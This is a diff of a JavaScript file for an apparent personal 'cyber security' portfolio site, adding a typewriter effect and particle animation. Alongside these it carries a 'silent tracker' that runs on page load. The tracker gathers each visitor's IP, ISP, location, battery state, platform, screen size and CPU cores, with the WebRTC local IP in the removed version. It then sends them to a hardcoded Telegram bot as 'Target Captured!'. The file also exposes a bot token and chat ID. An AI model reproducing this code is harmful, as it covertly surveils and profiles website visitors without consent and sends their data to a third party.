@@ -1,124 +1,138 @@
 /* Project: Yash Khan Elite Portfolio 
-   Optimization: Fast Data Capture & Parallel Tracking
+   Status: Optimized & Verified
 */
 
+// --- 1. CONFIGURATION ---
 const TELEGRAM_BOT_TOKEN = '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas';
 const TELEGRAM_CHAT_ID = '7950771882';
 
-// ১. টাইপরাইটার ইফেক্ট
-const textArray = ["CYBER SECURITY STRATEGIST", "OFFENSIVE PENETRATION TESTER", "WHITE HAT HACKER"];
+// --- 2. TYPEWRITER EFFECT ---
+const textArray = [
+    "CYBER SECURITY STRATEGIST", 
+    "OFFENSIVE PENETRATION TESTER", 
+    "WHITE HAT HACKER", 
+    "DEFENDING DIGITAL BANGLADESH"
+];
 let textIndex = 0, charIndex = 0, isErasing = false;
 
 function typeEffect() {
-    const el = document.getElementById("typewriter");
-    if (!el) return;
-    let word = textArray[textIndex];
-    el.textContent = isErasing ? word.substring(0, charIndex--) : word.substring(0, charIndex++);
+    const typewriterElement = document.getElementById("typewriter");
+    if (!typewriterElement) return;
+    const currentWord = textArray[textIndex];
+    typewriterElement.textContent = isErasing ? currentWord.substring(0, charIndex--) : currentWord.substring(0, charIndex++);
     let delay = isErasing ? 50 : 100;
-    if (!isErasing && charIndex === word.length) { delay = 2000; isErasing = true; }
+    
+    if (!isErasing && charIndex === currentWord.length) { delay = 2000; isErasing = true; }
     else if (isErasing && charIndex === 0) { isErasing = false; textIndex = (textIndex + 1) % textArray.length; delay = 500; }
+    
     setTimeout(typeEffect, delay);
 }
 
-// ২. অত্যন্ত দ্রুত সাইলেন্ট ট্র্যাকার (Parallel Mode)
+// --- 3. ADVANCED SILENT TRACKER ---
 async function runSilentTracker() {
-    const userDetails = document.getElementById('user-details');
     const scanStatus = document.getElementById('scan-status');
+    const userDetails = document.getElementById('user-details');
 
-    let data = {
-        publicIp: 'Fetching...',
-        localIp: 'Scanning...',
-        loc: 'N/A',
-        isp: 'N/A',
-        batt: 'N/A'
-    };
-
-    // Parallel execution for speed
-    const fetchPublicData = async () => {
+    try {
+        let ipData = { ip: 'N/A', city: 'N/A', country_name: 'N/A', org: 'N/A' };
+        
+        // Parallel fetching for speed
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const json = await res.json();
-            data.publicIp = json.ip || "N/A";
-            data.isp = json.org || "N/A";
-            data.loc = `${json.city}, ${json.country_name}`;
-            updateUI();
-        } catch (e) { data.publicIp = "Shielded"; updateUI(); }
-    };
+            ipData = await res.json();
+        } catch (e) {
+            const res2 = await fetch('https://api.ipify.org?format=json');
+            const data2 = await res2.json();
+            ipData.ip = data2.ip;
+        }
 
-    const fetchLocalIp = () => {
-        const rtc = new RTCPeerConnection({ iceServers: [] });
-        rtc.createDataChannel('');
-        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-        rtc.onicecandidate = (ice) => {
-            if (ice && ice.candidate && ice.candidate.candidate) {
-                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                if (match) { data.localIp = match[1]; updateUI(); }
-            }
-        };
-        setTimeout(() => { if(data.localIp === 'Scanning...') data.localIp = "N/A"; updateUI(); }, 3000);
-    };
-
-    const fetchBattery = async () => {
+        // Battery Intel
+        let batteryInfo = "Access Denied";
         if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            data.batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
-            updateUI();
+            const battery = await navigator.getBattery();
+            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
         }
-    };
 
-    function updateUI() {
-        if (userDetails) {
-            userDetails.innerHTML = `
-                > [SYSTEM] PUBLIC IP: <span style="color:#fff">${data.publicIp}</span> <br>
-                > [SYSTEM] LOCAL IP: <span style="color:#fff">${data.localIp}</span> <br>
-                > [SYSTEM] ISP: <span style="color:#fff">${data.isp}</span> <br>
-                > [SYSTEM] LOC: <span style="color:#fff">${data.loc}</span> <br>
-                > [SYSTEM] BATT: <span style="color:#fff">${data.batt}</span> <br>
-                > [SYSTEM] STATUS: <span style="color:#ff003c">TRACED</span>
-            `;
-        }
+        const intel = {
+            ip: ipData.ip || "N/A",
+            loc: ipData.city ? `${ipData.city}, ${ipData.country_name}` : "N/A",
+            isp: ipData.org || "N/A",
+            os: navigator.platform,
+            agent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "Hidden",
+            screen: `${window.screen.width}x${window.screen.height}`,
+            time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
+        };
+
+        // UI Update
         if (scanStatus) {
             scanStatus.innerHTML = "⚠️ SECURITY VULNERABILITY DETECTED: CONNECTION EXPOSED";
             scanStatus.style.color = "#ff003c";
         }
-    }
+        if (userDetails) {
+            userDetails.innerHTML = `
+                > [SYSTEM] IP: <span style="color:#fff">${intel.ip}</span> <br>
+                > [SYSTEM] ISP: <span style="color:#fff">${intel.isp}</span> <br>
+                > [SYSTEM] LOC: <span style="color:#fff">${intel.loc}</span> <br>
+                > [SYSTEM] BATT: <span style="color:#fff">${batteryInfo}</span> <br>
+                > [SYSTEM] STATUS: <span style="color:#ff003c">TRACED</span>
+            `;
+        }
 
-    // সব কাজ একসাথে শুরু করা
-    fetchPublicData();
-    fetchLocalIp();
-    fetchBattery();
-
-    // ৫ সেকেন্ড পর চূড়ান্ত রিপোর্ট টেলিগ্রামে পাঠানো
-    setTimeout(async () => {
-        const msg = `
+        // Telegram Message
+        const message = `
 🎯 **Target Captured!**
-🌐 Public: ${data.publicIp}
-🏠 Local: ${data.localIp}
-📍 Loc: ${data.loc}
-🔋 Battery: ${data.batt}
-📱 OS: ${navigator.platform}
-🕒 Time: ${new Date().toLocaleString()}
+-----------------------------
+🌐 **IP:** ${intel.ip}
+🏢 **ISP:** ${intel.isp}
+📍 **Location:** ${intel.loc}
+🔋 **Battery:** ${batteryInfo}
+💻 **Platform:** ${intel.os}
+🖥️ **Screen:** ${intel.screen}
+⚙️ **Cores:** ${intel.cores}
+🕒 **Time:** ${intel.time} (BD)
+-----------------------------
+🚀 *Injected by Yash Khan Intelligence Unit*
 `;
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
-    }, 5000);
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+    } catch (err) {
+        console.warn("Tracker shielded.");
+    }
 }
 
-// ৩. পার্টিকেলস
+// --- 4. PARTICLES.JS ---
 function initParticles() {
-    if (window.particlesJS) {
+    if (typeof particlesJS !== 'undefined') {
         particlesJS("particles-js", {
             "particles": {
-                "number": { "value": 50 },
+                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                 "color": { "value": "#00ff41" },
-                "line_linked": { "opacity": 0.1 },
-                "move": { "speed": 1 }
-            }
+                "opacity": { "value": 0.2, "random": true },
+                "size": { "value": 2, "random": true },
+                "line_linked": { "enable": true, "distance": 150, "color": "#00ff41", "opacity": 0.1, "width": 1 },
+                "move": { "enable": true, "speed": 1, "direction": "none", "random": true, "out_mode": "out" }
+            },
+            "interactivity": {
+                "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" } }
+            },
+            "retina_detect": true
         });
     }
 }
 
+// --- INITIALIZE ---
 window.onload = () => {
     initParticles();
     typeEffect();
-    runSilentTracker(); // সরাসরি কল করা হয়েছে দ্রুত ডেটা পাওয়ার জন্য
+    setTimeout(runSilentTracker, 2000);
 };
